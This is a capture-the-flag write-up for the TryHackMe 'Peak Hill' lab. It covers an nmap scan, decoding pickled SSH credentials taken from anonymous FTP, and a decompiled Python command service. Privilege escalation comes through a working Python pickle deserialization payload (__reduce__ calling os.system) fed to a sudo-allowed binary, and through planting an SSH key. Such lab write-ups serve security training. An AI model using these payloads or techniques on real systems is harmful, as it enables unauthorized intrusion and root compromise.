# Peak Hill 
[TryHackMe](https://tryhackme.com/room/peakhill)

## Task 1 Peak Hill

1. What is the user flag?

  Starting out with some nmap to see what ports are open on the box, using default scripts and scanning all TCP ports shows useful information about FTP:
  ```bash
  jeffrowell@kali:~/Documents/TryHackMe/Peak Hill$ nmap -sC -sV -Pn -n -p- -oN nmap/all $IP
  Starting Nmap 7.80 ( https://nmap.org ) at 2020-05-21 16:40 MDT
  Nmap scan report for 10.10.205.247
  Host is up (0.14s latency).
  Not shown: 65531 filtered ports
  PORT     STATE  SERVICE  VERSION
  20/tcp   closed ftp-data
  21/tcp   open   ftp      vsftpd 3.0.3
  | ftp-anon: Anonymous FTP login allowed (FTP code 230)
  |_-rw-r--r--    1 ftp      ftp            17 May 15 18:37 test.txt
  | ftp-syst:
  |   STAT:
  | FTP server status:
  |      Connected to ::ffff:10.8.21.42
  |      Logged in as ftp
  |      TYPE: ASCII
  |      No session bandwidth limit
  |      Session timeout in seconds is 300
  |      Control connection is plain text
  |      Data connections will be plain text
  |      At session startup, client count was 4
  |      vsFTPd 3.0.3 - secure, fast, stable
  |_End of status
  22/tcp   open   ssh      OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0)
  | ssh-hostkey:
  |   2048 04:d5:75:9d:c1:40:51:37:73:4c:42:30:38:b8:d6:df (RSA)
  |   256 7f:95:1a:d7:59:2f:19:06:ea:c1:55:ec:58:35:0c:05 (ECDSA)
  |_  256 a5:15:36:92:1c:aa:59:9b:8a:d8:ea:13:c9:c0:ff:b6 (ED25519)
  7321/tcp open   swx?
  | fingerprint-strings:
  |   DNSStatusRequestTCP, DNSVersionBindReqTCP, FourOhFourRequest, GenericLines, GetRequest, HTTPOptions, Help, JavaRMI, Kerberos, LANDesk-RC, LDAPBindReq, LDAPSearchReq, LPDString, NCP, NotesRPC, RPCCheck, RTSPRequest, SIPOptions, SMBProgNeg, SSLSessionReq, TLSSessionReq, TerminalServer, TerminalServerCookie, WMSRequest, X11Probe, afp, giop, ms-sql-s, oracle-tns:
  |     Username: Password:
  |   NULL:
  |_    Username:
  1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
  SF-Port7321-TCP:V=7.80%I=7%D=5/20%Time=5EC5F3AC%P=x86_64-pc-linux-gnu%r(NU
  SF:LL,A,"Username:\x20")%r(GenericLines,14,"Username:\x20Password:\x20")%r
  SF:(GetRequest,14,"Username:\x20Password:\x20")%r(HTTPOptions,14,"Username
  SF::\x20Password:\x20")%r(RTSPRequest,14,"Username:\x20Password:\x20")%r(R
  SF:PCCheck,14,"Username:\x20Password:\x20")%r(DNSVersionBindReqTCP,14,"Use
  SF:rname:\x20Password:\x20")%r(DNSStatusRequestTCP,14,"Username:\x20Passwo
  SF:rd:\x20")%r(Help,14,"Username:\x20Password:\x20")%r(SSLSessionReq,14,"U
  SF:sername:\x20Password:\x20")%r(TerminalServerCookie,14,"Username:\x20Pas
  SF:sword:\x20")%r(TLSSessionReq,14,"Username:\x20Password:\x20")%r(Kerbero
  SF:s,14,"Username:\x20Password:\x20")%r(SMBProgNeg,14,"Username:\x20Passwo
  SF:rd:\x20")%r(X11Probe,14,"Username:\x20Password:\x20")%r(FourOhFourReque
  SF:st,14,"Username:\x20Password:\x20")%r(LPDString,14,"Username:\x20Passwo
  SF:rd:\x20")%r(LDAPSearchReq,14,"Username:\x20Password:\x20")%r(LDAPBindRe
  SF:q,14,"Username:\x20Password:\x20")%r(SIPOptions,14,"Username:\x20Passwo
  SF:rd:\x20")%r(LANDesk-RC,14,"Username:\x20Password:\x20")%r(TerminalServe
  SF:r,14,"Username:\x20Password:\x20")%r(NCP,14,"Username:\x20Password:\x20
  SF:")%r(NotesRPC,14,"Username:\x20Password:\x20")%r(JavaRMI,14,"Username:\
  SF:x20Password:\x20")%r(WMSRequest,14,"Username:\x20Password:\x20")%r(orac
  SF:le-tns,14,"Username:\x20Password:\x20")%r(ms-sql-s,14,"Username:\x20Pas
  SF:sword:\x20")%r(afp,14,"Username:\x20Password:\x20")%r(giop,14,"Username
  SF::\x20Password:\x20");
  Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

  Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
  ```

  We can FTP to the box with `Anonymous` user and an empty password. Once connected over ftp, we see there is a credential file, `.creds`:

  ```bash
  ftp> ls -a
  200 PORT command successful. Consider using PASV.
  150 Here comes the directory listing.
  drwxr-xr-x    2 ftp      ftp          4096 May 15 18:37 .
  drwxr-xr-x    2 ftp      ftp          4096 May 15 18:37 ..
  -rw-r--r--    1 ftp      ftp          7048 May 15 18:37 .creds
  -rw-r--r--    1 ftp      ftp            17 May 15 18:37 test.txt
  226 Directory send OK.
  ftp> get .creds
  local: .creds remote: .creds
  200 PORT command successful. Consider using PASV.
  150 Opening BINARY mode data connection for .creds (7048 bytes).
  226 Transfer complete.
  7048 bytes received in 0.00 secs (5.1984 MB/s)
  ftp>
  ```

  After pulling down the `.creds` file and looking at it's contents, we see it is a binary string:

  ```
  jeffrowell@kali:~/Documents/Peak Hill$ cat .creds
  1000000000000011010111010111000100000000001010000101100000001010000000000000000000000000011100110111001101101000010111110111000001100001011100110111001100110001001101010111000100000001010110000000000100000000000000000000000001110101011100010000001010000110011100010000001101011000000010010000000000000000000000000111001101110011011010000101111101110101011100110110010101110010001100010111000100000100010110000000000100000000000000000000000001101000011100010000010110000110011100010000011001011000000010100000000000000000000000000111001101110011011010000101111101110000011000010111001101110011001100100011010101110001000001110101100000000001000000000000000000000000011100100111000100001000100001100111000100001001010110000000101000000000000000000000000001110011011100110110100001011111011100000110000101110011011100110011001000110000011100010000101001101000000001011000011001110001000010110101100000001001000000000000000000000000011100110111001101101000010111110111000001100001011100110111001100110111011100010000110001011000000000010000000000000000000000000101111101110001000011011000011001110001000011100101100000001001000000000000000000000000011100110111001101101000010111110111010101110011011001010111001000110000011100010000111101011000000000010000000000000000000000000110011101110001000100001000011001110001000100010101100000001010000000000000000000000000011100110111001101101000010111110111000001100001011100110111001100110010001101100111000100010010010110000000000100000000000000000000000001101100011100010001001110000110011100010001010001011000000010010000000000000000000000000111001101110011011010000101111101110000011000010111001101110011001101010111000100010101010110000000000100000000000000000000000000110011011100010001011010000110011100010001011101011000000010010000000000000000000000000111001101110011011010000101111101110000011000010111001101110011001100010111000100011000010110000000000100000000000000000000000000110001011100010001100110000110011100010001101001011000000010100000000000000000000000000111001101110011011010000101111101110000011000010111001101110011001100100011001001110001000110110110100000001101100001100111000100011100010110000000101000000000000000000000000001110011011100110110100001011111011100000110000101110011011100110011000100110010011100010001110101011000000000010000000000000000000000000100000001110001000111101000011001110001000111110101100000001001000000000000000000000000011100110111001101101000010111110111010101110011011001010111001000110010011100010010000001011000000000010000000000000000000000000110010101110001001000011000011001110001001000100101100000001001000000000000000000000000011100110111001101101000010111110111010101110011011001010111001000110101011100010010001101011000000000010000000000000000000000000110100101110001001001001000011001110001001001010101100000001010000000000000000000000000011100110111001101101000010111110111000001100001011100110111001100110001001110000111000100100110011010000000110110000110011100010010011101011000000010100000000000000000000000000111001101110011011010000101111101110000011000010111001101110011001100100011011101110001001010000101100000000001000000000000000000000000011001000111000100101001100001100111000100101010010110000000100100000000000000000000000001110011011100110110100001011111011100000110000101110011011100110011001101110001001010110101100000000001000000000000000000000000011010110111000100101100100001100111000100101101010110000000101000000000000000000000000001110011011100110110100001011111011100000110000101110011011100110011000100111001011100010010111001011000000000010000000000000000000000000111010001110001001011111000011001110001001100000101100000001001000000000000000000000000011100110111001101101000010111110111000001100001011100110111001100110110011100010011000101011000000000010000000000000000000000000111001101110001001100101000011001110001001100110101100000001001000000000000000000000000011100110111001101101000010111110111000001100001011100110111001100111001011100010011010001101000000110011000011001110001001101010101100000001010000000000000000000000000011100110111001101101000010111110111000001100001011100110111001100110010001100110111000100110110010110000000000100000000000000000000000001110111011100010011011110000110011100010011100001011000000010100000000000000000000000000111001101110011011010000101111101110000011000010111001101110011001100100011000101110001001110010110100000010110100001100111000100111010010110000000100100000000000000000000000001110011011100110110100001011111011100000110000101110011011100110011010001110001001110110110100000010011100001100111000100111100010110000000101000000000000000000000000001110011011100110110100001011111011100000110000101110011011100110011000100110100011100010011110101011000000000010000000000000000000000000011000001110001001111101000011001110001001111110101100000001001000000000000000000000000011100110111001101101000010111110111010101110011011001010111001000110110011100010100000001011000000000010000000000000000000000000110111001110001010000011000011001110001010000100101100000001001000000000000000000000000011100110111001101101000010111110111000001100001011100110111001100110010011100010100001101011000000000010000000000000000000000000110001101110001010001001000011001110001010001010101100000001010000000000000000000000000011100110111001101101000010111110111000001100001011100110111001100110001001100110111000101000110011010000000100010000110011100010100011101011000000010100000000000000000000000000111001101110011011010000101111101110000011000010111001101110011001100010011011001110001010010000110100001000001100001100111000101001001010110000000100100000000000000000000000001110011011100110110100001011111011100000110000101110011011100110011100001110001010010100110100000011110100001100111000101001011010110000000101000000000000000000000000001110011011100110110100001011111011100000110000101110011011100110011000100110111011100010100110001101000001010011000011001110001010011010101100000001010000000000000000000000000011100110111001101101000010111110111000001100001011100110111001100110010001101000111000101001110011010000011111010000110011100010100111101011000000010010000000000000000000000000111001101110011011010000101111101110101011100110110010101110010001100110111000101010000011010000000100010000110011100010101000101011000000010010000000000000000000000000111001101110011011010000101111101110101011100110110010101110010001101000111000101010010011010000010110010000110011100010101001101011000000010100000000000000000000000000111001101110011011010000101111101110000011000010111001101110011001100010011000101110001010101000110100000001101100001100111000101010101010110000000100100000000000000000000000001110011011100110110100001011111011100000110000101110011011100110011000001110001010101100101100000000001000000000000000000000000011100000111000101010111100001100111000101011000010110000000101000000000000000000000000001110011011100110110100001011111011100000110000101110011011100110011000100110000011100010101100101101000000110011000011001110001010110100110010100101110
  ```

  After playing around and throwing this into some binary to ASCII decoders, the results showed some data, but seemingly not all of it:

  ```
  ]q�(X
���ssh_pass15qX���uqqX	���ssh_user1qX���hqqX
���ssh_pass25qX���rqq	X
���ssh_pass20q
hqX	���ssh_pass7qX���_q
qX	���ssh_user0qX���gqqX
���ssh_pass26qX���lqqX	���ssh_pass5qX���3qqX	���ssh_pass1qX���1qqX
���ssh_pass22qh
qX
���ssh_pass12qX���@qqX	���ssh_user2q X���eq!q"X	���ssh_user5q#X���iq$q%X
���ssh_pass18q&h
q'X
���ssh_pass27q(X���dq)q*X	���ssh_pass3q+X���kq,q-X
���ssh_pass19q.X���tq/q0X	���ssh_pass6q1X���sq2q3X	���ssh_pass9q4hq5X
���ssh_pass23q6X���wq7q8X
���ssh_pass21q9hq:X	���ssh_pass4q;hq<X
���ssh_pass14q=X���0q>q?X	���ssh_user6q@X���nqAqBX	���ssh_pass2qCX���cqDqEX
���ssh_pass13qFhqGX
���ssh_pass16qHhAqIX	���ssh_pass8qJhqKX
���ssh_pass17qLh)qMX
���ssh_pass24qNh>qOX	���ssh_user3qPhqQX	���ssh_user4qRh,qSX
���ssh_pass11qTh
qUX	���ssh_pass0qVX���pqWqXX
���ssh_pass10qYhqZe.
  ```

  The next thing was to convert the binary string into raw bytes and right it to a file to treat as a Python [pickle](https://docs.python.org/3/library/pickle.html) object. Since we have a mix of ASCII and raw bytes in the decoding, we will need to convert them both to the same format. We can do this using Perl:
  ```bash
  jeffrowell@kali:~/Documents/TryHackMe/Peak Hill$ cat .creds | perl -lpe '$_=pack"B*",$_' > creds.pickle
  ```

  Now with the raw binary file, we can use Python to read in the data as if it were a pickled object and see what it returns. This initial script looked like this

  ```python
  #!/usr/bin/python3

  import pickle

  data = pickle.load(open('creds.pickle', 'rb'))
  print(data)
  ```

  After printing out the data structure, we can see the following list of lists, that seems to contain a deconstructed SSH username and password that we need to piece back together:

  ```bash
  jeffrowell@kali:~/Documents/TryHackMe/Peak Hill$ ./script.py
  [('ssh_pass15', 'u'), ('ssh_user1', 'h'), ... <REDACTED> ...  ('ssh_pass10', '1')]
  ```

  So lets add to our script functionality to sort the strings in ascending numerical order. We can do this leveraging Python's `natsort` library:

  ```python
  #!/usr/bin/python3

  import pickle
  from natsort import natsorted

  data = pickle.load(open('creds.pickle', 'rb'))
  sorted_data = natsorted(data)

  u = []
  p = []
  for item in sorted_data:
      if 'user' in item[0]:
          u.append(item[1])
      else:
          p.append(item[1])

  print('Username: ' + ''.join(u))
  print('Password: ' + ''.join(p))
  ```

  After running the script, we obtain the SSH username and password for the box:
  ```bash
  jeffrowell@kali:~/Documents/TryHackMe/Peak Hill$ ./script.py
  Username: <REDACTED>
  Password: <REDACTED>
  ```

  When we first get into the box, we notice there is a compiled Python file in `gherkin`
's home directory:
  ```bash
  gherkin@ubuntu-xenial:~$ ls -a
  .  ..  .cache  cmd_service.pyc
  gherkin@ubuntu-xenial:~$
  ```

  We can scp this file to our local machines, and reverse it using [uncompyle6](https://pypi.org/project/uncompyle6/):
  ```python
  # uncompyle6 version 3.7.0
  # Python bytecode 3.8 (3413)
  # Decompiled from: Python 3.8.2 (default, Apr  1 2020, 15:52:55)
  # [GCC 9.3.0]
  # Embedded file name: ./cmd_service.py
  # Compiled at: 2020-05-14 11:55:16
  # Size of source mod 2**32: 2140 bytes
  from Crypto.Util.number import bytes_to_long, long_to_bytes
  import sys, textwrap, socketserver, string, readline, threading
  from time import *
  import getpass, os, subprocess
  username = long_to_bytes(<REDACTED>)
  password = long_to_bytes(<REDACTED>)

  class Service(socketserver.BaseRequestHandler):

      def ask_creds(self):
          username_input = self.receive(b'Username: ').strip()
          password_input = self.receive(b'Password: ').strip()
          print(username_input, password_input)
          if username_input == username:
              if password_input == password:
                  return True
          return False

      def handle(self):
          loggedin = self.ask_creds()
          if not loggedin:
              self.send(b'Wrong credentials!')
              return None
          self.send(b'Successfully logged in!')
          while True:
              command = self.receive(b'Cmd: ')
              p = subprocess.Popen(command,
                shell=True, stdout=(subprocess.PIPE), stderr=(subprocess.PIPE))
              self.send(p.stdout.read())

      def send(self, string, newline=True):
          if newline:
              string = string + b'\n'
          self.request.sendall(string)

      def receive(self, prompt=b'> '):
          self.send(prompt, newline=False)
          return self.request.recv(4096).strip()

  class ThreadedService(socketserver.ThreadingMixIn, socketserver.TCPServer, socketserver.DatagramRequestHandler):
      pass

  def main():
      print('Starting server...')
      port = 7321
      host = '0.0.0.0'
      service = Service
      server = ThreadedService((host, port), service)
      server.allow_reuse_address = True
      server_thread = threading.Thread(target=(server.serve_forever))
      server_thread.daemon = True
      server_thread.start()
      print('Server started on ' + str(server.server_address) + '!')
      while True:
          sleep(10)

  if __name__ == '__main__':
      main()
  ```

  ```python
  >>> from Crypto.Util.number import bytes_to_long, long_to_bytes
  >>> username = long_to_bytes(<REDACTED>)
  >>> username
  b'<REDACTED>'
  >>> password = long_to_bytes(<REDACTED>)
  >>> password
  b'<REDACTED>'
  >>>
  ```

  ```bash
  Cmd: ls ~
  user.txt

  Cmd: cat ~/user.txt
  <REDACTED>
  ```

2. What is the root flag?

  Now that we are on the box, and we understand the 7321/tcp port from earlier, we can connect to the service and log in as `dill`. When connected, we are given a "shell" to run commands. First thing checked was files we can run as root:
  ```bash
  Cmd: sudo -l
  Matching Defaults entries for dill on ubuntu-xenial:
      env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

  User dill may run the following commands on ubuntu-xenial:
      (ALL : ALL) NOPASSWD: /opt/peak_hill_farm/peak_hill_farm
  ```

  Trying to run this command seemingly expects input after running, and this shell is not interactive due to the way `subprocess` is being called:
  ```bash
  Cmd: sudo /opt/peak_hill_farm/peak_hill_farm
  Peak Hill Farm 1.0 - Grow something on the Peak Hill Farm!

  to grow:
  ```

  So to break out of the shell we can echo `gherkin`'s public SSH key into `dill`'s authorized keys.

  Once we are in, running the `peak_hill_farm` file with random input sometimes gives us a base64 decode error:

  ```bash
  dill@ubuntu-xenial:/opt/peak_hill_farm$ sudo ./peak_hill_farm
  Peak Hill Farm 1.0 - Grow something on the Peak Hill Farm!

  to grow: something
  failed to decode base64
  ```

  So this could be a pickle deserialization vulnerability, as noted in the [pickle documentation](https://docs.python.org/3/library/pickle.html). Our payload will be similar to [well documented attacks](https://davidhamann.de/2020/04/05/exploiting-python-pickle/):

  ```python
  import pickle
  import base64

  class RCE(object):
      def __reduce__(self):
          import os
          cmd = ('cat /root/*')
          return os.system, (cmd, )

  if __name__ == '__main__':
      pickle_payload = base64.b64encode(pickle.dumps(RCE()))
      print(pickle_payload)
  ```

  After running this we will have a base64 encoded string that the `peak_hill_farm` will deserialize, and upon deserialization our object will be contructed and `__reduce__()` gets called, envoking a command that cat's the contents of root's home:

  ```bash
  jeffrowell@kali:~/Documents/TryHackMe/Peak Hill$ python3 payload.py
  b'gASVJgAAAAAAAACMBXBvc2l4lIwGc3lzdGVtlJOUjAtjYXQgL3Jvb3QvKpSFlFKULg=='
  ```

  Now, supplying this as input to the `peak_hill_farm` binary gets the root flag:
  ```bash
  dill@ubuntu-xenial:/opt/peak_hill_farm$ sudo ./peak_hill_farm
  Peak Hill Farm 1.0 - Grow something on the Peak Hill Farm!

  to grow: gASVJgAAAAAAAACMBXBvc2l4lIwGc3lzdGVtlJOUjAtjYXQgL3Jvb3QvKpSFlFKULg==
  <REDACTED>
  This grew to:
  0
  dill@ubuntu-xenial:/opt/peak_hill_farm$
  ```
